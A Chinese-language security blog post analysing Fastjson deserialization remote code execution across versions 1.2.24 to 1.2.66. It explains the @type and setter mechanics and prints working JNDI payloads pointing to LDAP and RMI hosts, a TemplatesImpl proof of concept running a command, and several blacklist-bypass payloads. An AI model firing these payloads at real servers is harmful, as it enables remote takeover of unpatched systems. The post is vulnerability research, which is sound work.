---
title: "Fastjson 反序列化RCE分析"
date: 2020-04-26T11:54:56+08:00
draft: false
tags:
- fastjson
- java
- 反序列化
series:
-
categories:
- 代码审计
---

fastjson反序列化RCE
<!--more-->
## 前言

fastjson是阿里巴巴的一个json库，频频爆RCE。本文分析fastjson至今的一些RCE漏洞。

## fastjson的使用
引入库

```xml
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.24</version>
</dependency>
```
创建一个实体类User

```java
package org.chabug.fastjson.model;

public class User {
    private int id;
    private int age;
    private String name;

    @Override
    public String toString() {
        return "User{" +
            "id=" + id +
            ", age=" + age +
            ", name='" + name + '\'' +
            '}';
    }

    public int getId() {
        return id;
    }

    public void setId(int id) {
        this.id = id;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }
}
```
使用fastjson解析为字符串、从字符串解析为对象：

```java
package org.chabug.fastjson.run;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.serializer.SerializerFeature;
import org.chabug.fastjson.model.User;

import java.util.HashMap;
import java.util.Map;

public class JSONTest {
    public static void main(String[] args) {
        Map<String, Object> map = new HashMap<String, Object>();
        map.put("key1", "One");
        map.put("key2", "Two");
        String mapJson = JSON.toJSONString(map);
        System.out.println(mapJson);

        System.out.println("--------------------------");


        User user = new User();
        user.setId(1);
        user.setAge(17);
        user.setName("张三");

        // 对象转字符串
        String s1 = JSON.toJSONString(user);
        String s2 = JSON.toJSONString(user, SerializerFeature.WriteClassName);
        System.out.println(s1);
        System.out.println(s2);

        System.out.println("--------------------------");

        // 字符串转对象
        User o1 = (User) JSON.parse(s2);
        System.out.println("o1:"+o1);
        System.out.println(o1.getClass().getName());

        JSONObject o2 = JSON.parseObject(s2);
        System.out.println("o2:"+o2);
        System.out.println(o2.getClass().getName());

        Object o3 = JSON.parseObject(s2, Object.class);
        System.out.println("o3:"+o3);
        System.out.println(o3.getClass().getName());

    }
}
```
运行结果

```text
{"key1":"One","key2":"Two"}
--------------------------
{"age":17,"id":1,"name":"张三"}
{"@type":"org.chabug.fastjson.model.User","age":17,"id":1,"name":"张三"}
--------------------------
o1:User{id=1, age=17, name='张三'}
org.chabug.fastjson.model.User
o2:{"name":"张三","id":1,"age":17}
com.alibaba.fastjson.JSONObject
o3:User{id=1, age=17, name='张三'}
org.chabug.fastjson.model.User
```
fastjson通过`JSON.toJSONString()`将对象转为字符串(序列化)，当使用`SerializerFeature.WriteClassName`参数时会将对象的类名写入`@type`字段中，在重新转回对象时会根据`@type`来指定类，进而调用该类的`set`、`get`方法。因为这个特性，我们可以指定`@type`为任意存在问题的类，造成一些问题。

在字符串转对象的过程中(反序列化)，主要使用`JSON.parse()`和`JSON.parseObject()`两个方法，两者区别在于`parse()`会返回实际类型(User)的对象，而`parseObject()`在不指定class时返回的是`JSONObject`，指定class才会返回实际类型(User)的对象，也就是`JSON.parseObject(s2)`和`JSON.parseObject(s2, Object.class)`的区别，这里也可以指定为`User.class`。

我们再来看`@type`的问题，我定义了一个Evil类，在其set方法中可以执行命令

```java
package org.chabug.fastjson.model;

import java.io.IOException;

public class Evil {
    private String cmd;

    public String getCmd() {
        System.out.println("getCmd()");
        return cmd;
    }

    public void setCmd(String cmd) {
        System.out.println("setCmd()");
        this.cmd = cmd;
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public Evil() {
        System.out.println("Evil()");
    }
}
```
用springboot起了一个web
![image.png](https://y4er.com/img/uploads/20200426110221.png)

成功弹出了计算器
![image.png](https://y4er.com/img/uploads/20200426112943.png)

我们通过控制`@type`来实现反序列化恶意Evil类，从而RCE，很简单只是举个例子说明`@type`的使用。

那么到这里还有一个问题，为什么写在`setCmd`方法会自动调用呢？

## setter、getter、is自动调用

对应的Evil
![image.png](https://y4er.com/img/uploads/20200426112989.png)

写一个test测试下
![image.png](https://y4er.com/img/uploads/20200426117757.png)

可以看到`parseObject(evil)`的get、set、构造方法都自动调用了，另外两种解析方式只调用了set、构造方法。

在前文中我们知道`parseObject(evil)`返回的是`JSONObject`对象，跟进其方法发现也是使用parse解析的，但是多了一个`(JSONObject)toJSON(obj)`
![image.png](https://y4er.com/img/uploads/20200426110951.png)
这个方法调用的get，堆栈如下

```text
getCmd:11, Evil (org.chabug.fastjson.model)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:62, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:498, Method (java.lang.reflect)
get:451, FieldInfo (com.alibaba.fastjson.util)
getPropertyValue:105, FieldSerializer (com.alibaba.fastjson.serializer)
getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)
toJSON:902, JSON (com.alibaba.fastjson)
toJSON:824, JSON (com.alibaba.fastjson)
parseObject:206, JSON (com.alibaba.fastjson)
main:13, Test (org.chabug.fastjson.run)
```
比较简单，不详细分析，大致就是通过反射调用getter方法获取字段的值存入hashmap。那么setter在哪调用的？

在`com.alibaba.fastjson.util.JavaBeanInfo#build`中

![image.png](https://y4er.com/img/uploads/20200426115009.png)

在通过`@type`拿到类之后，通过反射拿到该类所有的方法存入methods，接下来遍历methods进而获取get、set方法，如上图。总结set方法自动调用的条件为：
1. 方法名长度大于4
2. 非静态方法
3. 返回值为void或当前类
4. 方法名以set开头
5. 参数个数为1

当满足条件之后会从方法名截取属性名，截取时会判断`_`，如果是`set_name`会截取为`name`属性，具体逻辑如下：
![image.png](https://y4er.com/img/uploads/20200426118528.png)

当截取完但是找不到这个属性
![image.png](https://y4er.com/img/uploads/20200426113707.png)

会判断传入的第一个参数类型是否为布尔型，是的话就在截取完的变量前加上`is`，截取propertyName的第一个字符转大写和第二个字符，并且然后重新尝试获取属性字段。

比如：public boolean setBoy(boolean t) 会寻找`isBoy`字段。

set的整个判断就是：如果有setCmd()会绑定cmd属性，如果该类没有cmd属性会绑定isCmd属性。

get的判断
![image.png](https://y4er.com/img/uploads/20200426119593.png)
总结下就是：
1. 方法名长度大于等于4
2. 非静态方法
3. 以get开头且第4个字母为大写
4. 无传入参数
5. 返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong

当程序绑定了对应的字段之后，如果传入json字符串的键值中存在这个值，就会去调用执行对应的setter、构造方法。

小结：
1. parse(jsonStr) 构造方法+Json字符串指定属性的setter()+特殊的getter()
2. parseObject(jsonStr) 构造方法+Json字符串指定属性的setter()+所有getter() 包括不存在属性和私有属性的getter()
3. parseObject(jsonStr,Object.class) 构造方法+Json字符串指定属性的setter()+特殊的getter()

## fastjson漏洞历程
fastjson漏洞经历了多次绕过及修复，甚至出现了加密黑名单防止安全研究= =

### 1.2.22-1.2.24
在小于fastjson1.2.22-1.2.24版本中有两条利用链。
1. JNDI `com.sun.rowset.JdbcRowSetImpl`
2. JDK7u21 `com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`

#### JNDI利用链
JNDI传输过程中使用的就是序列化和反序列化，所以通杀三种解析方式

```java
JSON.parse(evil);
JSON.parseObject(evil);
JSON.parseObject(evil, Object.class);
```

原理就是setter的自动调用

```java
package org.chabug.fastjson.run;

import com.sun.rowset.JdbcRowSetImpl;

import java.sql.SQLException;

public class Test {
    public static void main(String[] args) {


        JdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();
        try {
            jdbcRowSet.setDataSourceName("ldap://localhost:1389/#Calc");
            jdbcRowSet.setAutoCommit(true);
        } catch (SQLException e) {
            e.printStackTrace();
        }
    }
}
```

![image.png](https://y4er.com/img/uploads/20200426110423.png)

setDataSourceName()和setAutoCommit()满足setter自动调用的条件，当我们传入对应json键值对时就会触发setter，进而触发jndi链接。payload如下

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/#Calc", "autoCommit":true}
```

#### TemplatesImpl利用链
条件苛刻
1. 服务端使用parseObject()时，必须使用如下格式才能触发漏洞：`JSON.parseObject(input, Object.class, Feature.SupportNonPublicField)`
2. 服务端使用parse()时，需要`JSON.parse(text1,Feature.SupportNonPublicField)`

poc

```java
package org.chabug.fastjson.run;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.tomcat.util.codec.binary.Base64;

public class JDK7u21 {
    // 参考https://y4er.com/post/ysoserial-commonscollections-2/
    public static byte[] getevilbyte() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = pool.get(test.class.getName());
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "Y4er" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass((pool.get(AbstractTranslet.class.getName())));

        return cc.toBytecode();
    }


    //main函数调用以下poc而已
    public static void main(String args[]) {
        try {
            byte[] evilCode = getevilbyte();
            String evilCode_base64 = Base64.encodeBase64String(evilCode);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS + "\",\"_bytecodes\":[\"" + evilCode_base64 + "\"],'_name':'asd','_tfactory':{ },\"_outputProperties\":{ }," + "\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(text1);
            ParserConfig config = new ParserConfig();
            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static class test {

    }
}
```
看完poc应该考虑的几个问题：
1. 为什么`parseObject`需要`Feature.SupportNonPublicField`？
2. 为什么需要`_outputProperties`属性？
3. `_bytecodes`为什么需要base64编码？
4. `_tfactory`为什么为{}？

**问题1：`Feature.SupportNonPublicField`**
在fastjson中默认并不能序列化private属性，而我们使用的`TemplatesImpl`利用链的多个属性都是private，所以在反序列化的时候需要加上`Feature.SupportNonPublicField`，这也成了这个利用链的最大限制。
![image.png](https://y4er.com/img/uploads/20200426119442.png)

**问题2：为什么需要`_outputProperties`属性**
答案是为了触发`getOutputProperties()`。再问：如果getOutputProperties()是_outputProperties属性的getter方法那不符合规则啊！下面就来分析下：

getOutputProperties()方法其对应的属性应该为`public`的`outputProperties`，其实你删了`_`也可以，`_`并不是必须的，那么fastjson到底是怎么处理的呢？
![image.png](https://y4er.com/img/uploads/20200426114018.png)

在`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField`中解析每一个字段时，会进行一次灵活匹配`this.smartMatch()`
![image.png](https://y4er.com/img/uploads/20200426119256.png)
在进行is关键字判断之后，替换掉`-`和`_`再匹配getter和setter
![image.png](https://y4er.com/img/uploads/20200426111692.png)
所以就会调用`getOutputProperties()`
![image.png](https://y4er.com/img/uploads/20200426116858.png)
而其返回值又是Properties，所以可以完美调用`getOutputProperties()`，进而触发`newTransformer()`->`getTransletInstance()`->`newInstance()`，导致RCE。

**问题3：`_bytecodes`为什么需要base64编码**

在解析byte[]的时候进行了base64解码
![image.png](https://y4er.com/img/uploads/20200426117322.png)

跟进
![image.png](https://y4er.com/img/uploads/20200426115663.png)

**问题4：_tfactory为什么为{}**
在`fastjson-1.2.23.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.class:579`解析字段值时，会自动判断传入键值是否为空，如果为空会根据类属性定义的类型自动创建实例
![image.png](https://y4er.com/img/uploads/20200426117245.png)

到这算是把fastjson写的差不多，剩下的就是无尽的bypass。

### 1.2.25-1.2.41
在1.2.25版本中，重新使用jdbc利用链复现报错
![image.png](https://y4er.com/img/uploads/20200426118908.png)

使用idea对比两个jar包发现改为了checkAutoType()方法
![image.png](https://y4er.com/img/uploads/20200426110544.png)

跟进checkAutoType()发现
![image.png](https://y4er.com/img/uploads/20200426116206.png)

增加了类前缀黑名单白名单判断，在1.2.25版本中AutoTypeSupport默认false，需要显示关闭白名单

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
```
在关闭了AutoTypeSupport之后仍然需要绕过黑名单，以startsWith判断
![image.png](https://y4er.com/img/uploads/20200426117781.png)
但是在跟了TypeUtils.loadClass()之后会发现
![image.png](https://y4er.com/img/uploads/20200426110879.png)
如果classname以`[`开头loadClass会自动去掉，还有就是开头`L`结尾`;`的也会去掉，那么我们有了新的绕过方法：

```java
ParserConfig.getGlobalInstance().setAutoTypeSupport(true); // 必须显示关闭白名单
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://localhost:1389/#Calc", "autoCommit":true}
```
7u21的链同理，在1.2.25之后所谓的绕过都是在显示关闭白名单的条件下绕过的。

### 1.2.42绕过
在1.2.41中`L;`的方法测试可以，1.2.42中不行
![image.png](https://y4er.com/img/uploads/20200426118932.png)

对比jar发现ParserConfig中黑名单改为hash
![image.png](https://y4er.com/img/uploads/20200426114517.png)
classname截取`L;`
![image.png](https://y4er.com/img/uploads/20200426115617.png)

通过计算hash让我们不知道黑名单是什么类，但是加密方式在`com.alibaba.fastjson.util.TypeUtils#fnv1a_64`是有的
![image.png](https://y4er.com/img/uploads/20200426116258.png)
通过变量常用的jar、类、字符串碰撞hash得到黑名单，有一个项目已经做好了：https://github.com/LeadroyaL/fastjson-blacklist

绕过也比较简单，`com.alibaba.fastjson.parser.ParserConfig#checkAutoType`截取一次，`com.alibaba.fastjson.util.TypeUtils#loadClass`截取一次，那么双写就可以绕过

```json
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"ldap://localhost:1389/#Calc", "autoCommit":true}
```
### 1.2.43
判断了是否以`LL`开头，直接抛出异常
![image.png](https://y4er.com/img/uploads/20200426118900.png)

但是`[`还可以
```json
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
```

### 1.2.44
修复之前`[`的问题，虽然之前`[`是不能用的

### 1.2.45
增加了黑名单

```java
//需要有第三方组件ibatis-core 3:0
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://localhost:1099/Exploit"}}
```
### 1.2.47 通杀
通杀autotype和黑名单

```json
{
    "a": {
        "@type": "java.lang.Class", 
        "val": "com.sun.rowset.JdbcRowSetImpl"
    }, 
    "b": {
        "@type": "com.sun.rowset.JdbcRowSetImpl", 
        "dataSourceName": "ldap://localhost:1389/Exploit", 
        "autoCommit": true
    }
}
```
在TypeUtils的static初始化时调用`com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings`中会将常用的类通过loadclass()放入mapping中

```java
private static void addBaseClassMappings() {
    mappings.put("byte", Byte.TYPE);
    mappings.put("short", Short.TYPE);
    mappings.put("int", Integer.TYPE);
    mappings.put("long", Long.TYPE);
    mappings.put("float", Float.TYPE);
    mappings.put("double", Double.TYPE);
    mappings.put("boolean", Boolean.TYPE);
    mappings.put("char", Character.TYPE);
    mappings.put("[byte", byte[].class);
    mappings.put("[short", short[].class);
    mappings.put("[int", int[].class);
    mappings.put("[long", long[].class);
    mappings.put("[float", float[].class);
    mappings.put("[double", double[].class);
    mappings.put("[boolean", boolean[].class);
    mappings.put("[char", char[].class);
    mappings.put("[B", byte[].class);
    mappings.put("[S", short[].class);
    mappings.put("[I", int[].class);
    mappings.put("[J", long[].class);
    mappings.put("[F", float[].class);
    mappings.put("[D", double[].class);
    mappings.put("[C", char[].class);
    mappings.put("[Z", boolean[].class);
    Class<?>[] classes = new Class[]{Object.class, Cloneable.class, loadClass("java.lang.AutoCloseable"), Exception.class, RuntimeException.class, IllegalAccessError.class, IllegalAccessException.class, IllegalArgumentException.class, IllegalMonitorStateException.class, IllegalStateException.class, IllegalThreadStateException.class, IndexOutOfBoundsException.class, InstantiationError.class, InstantiationException.class, InternalError.class, InterruptedException.class, LinkageError.class, NegativeArraySizeException.class, NoClassDefFoundError.class, NoSuchFieldError.class, NoSuchFieldException.class, NoSuchMethodError.class, NoSuchMethodException.class, NullPointerException.class, NumberFormatException.class, OutOfMemoryError.class, SecurityException.class, StackOverflowError.class, StringIndexOutOfBoundsException.class, TypeNotPresentException.class, VerifyError.class, StackTraceElement.class, HashMap.class, Hashtable.class, TreeMap.class, IdentityHashMap.class, WeakHashMap.class, LinkedHashMap.class, HashSet.class, LinkedHashSet.class, TreeSet.class, TimeUnit.class, ConcurrentHashMap.class, loadClass("java.util.concurrent.ConcurrentSkipListMap"), loadClass("java.util.concurrent.ConcurrentSkipListSet"), AtomicInteger.class, AtomicLong.class, Collections.EMPTY_MAP.getClass(), BitSet.class, Calendar.class, Date.class, Locale.class, UUID.class, Time.class, java.sql.Date.class, Timestamp.class, SimpleDateFormat.class, JSONObject.class};
    Class[] var1 = classes;
    int var2 = classes.length;

    int var3;
    for(var3 = 0; var3 < var2; ++var3) {
        Class clazz = var1[var3];
        if (clazz != null) {
            mappings.put(clazz.getName(), clazz);
        }
    }

    String[] awt = new String[]{"java.awt.Rectangle", "java.awt.Point", "java.awt.Font", "java.awt.Color"};
    String[] spring = awt;
    var3 = awt.length;

    int var11;
    for(var11 = 0; var11 < var3; ++var11) {
        String className = spring[var11];
        Class<?> clazz = loadClass(className);
        if (clazz == null) {
            break;
        }

        mappings.put(clazz.getName(), clazz);
    }

    spring = new String[]{"org.springframework.util.LinkedMultiValueMap", "org.springframework.util.LinkedCaseInsensitiveMap", "org.springframework.remoting.support.RemoteInvocation", "org.springframework.remoting.support.RemoteInvocationResult", "org.springframework.security.web.savedrequest.DefaultSavedRequest", "org.springframework.security.web.savedrequest.SavedCookie", "org.springframework.security.web.csrf.DefaultCsrfToken", "org.springframework.security.web.authentication.WebAuthenticationDetails", "org.springframework.security.core.context.SecurityContextImpl", "org.springframework.security.authentication.UsernamePasswordAuthenticationToken", "org.springframework.security.core.authority.SimpleGrantedAuthority", "org.springframework.security.core.userdetails.User"};
    String[] var10 = spring;
    var11 = spring.length;

    for(int var12 = 0; var12 < var11; ++var12) {
        String className = var10[var12];
        Class<?> clazz = loadClass(className);
        if (clazz == null) {
            break;
        }

        mappings.put(clazz.getName(), clazz);
    }

}
```
然后开始解析json，当传入type时进入checkAutoType()检查类
![image.png](https://y4er.com/img/uploads/20200426116782.png)

在调用解析时我们没有传入预期的反序列化对象的对应类名时，会从mapping中或者deserializers.findClass()寻找
![image.png](https://y4er.com/img/uploads/20200426114621.png)
当找到类之后会直接return class，不会再进行autotype和黑名单校验，而在deserializers中有`java.lang.Class`
![image.png](https://y4er.com/img/uploads/20200426115596.png)

继续解析
![image.png](https://y4er.com/img/uploads/20200426117492.png)

获取到java.lang.class对应的反序列化处理类`com.alibaba.fastjson.serializer.MiscCodec`，然后开始deserializer.deserialze()反序列化
![image.png](https://y4er.com/img/uploads/20200426111709.png)
parser.parse()获取val的值
![image.png](https://y4er.com/img/uploads/20200426116949.png)
赋值给strVal，然后经过一系列判断之后
![image.png](https://y4er.com/img/uploads/20200426113708.png)
传入TypeUtils.loadClass()

在loadclass中将strVal加入到mapping中
![image.png](https://y4er.com/img/uploads/20200426118022.png)

此时mapping中有了jdbc的类名，而Mappings是ConcurrentMap类的，顾名思义就是在当前连接会话生效。所以我们需要在一次连接会话同时传入两个json键值对时，此次连接未断开时，继续解析第二个json键值对，然后和上文中提到的一样，在校验autotype和黑名单之前就已经return了clazz，变相绕过了黑名单，利用JNDI注入RCE。

### 1.2.48
黑名单多了两条，MiscCodec中将默认传入的cache变为false，checkAutoType()调整了逻辑

### 1.2.62
黑名单绕过
```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://127.0.0.1:1099/exploit"}";
```
### 1.2.66
也是黑名单绕过

```java
// 需要autotype true
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://192.168.80.1:1389/Calc"}}
```
## 总结
从`@type`属性牵扯出来一系列的RCE，整个过程分析下来还是很有收获，不停的bypass才是反序列化的最大乐趣。

## 参考链接
1. https://www.anquanke.com/post/id/181874
2. https://xz.aliyun.com/t/7027
3. [Fastjson反序列化漏洞 1.2.24-1.2.48](https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/)
4. https://mp.weixin.qq.com/s/i7-g89BJHIYTwaJbLuGZcQ


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**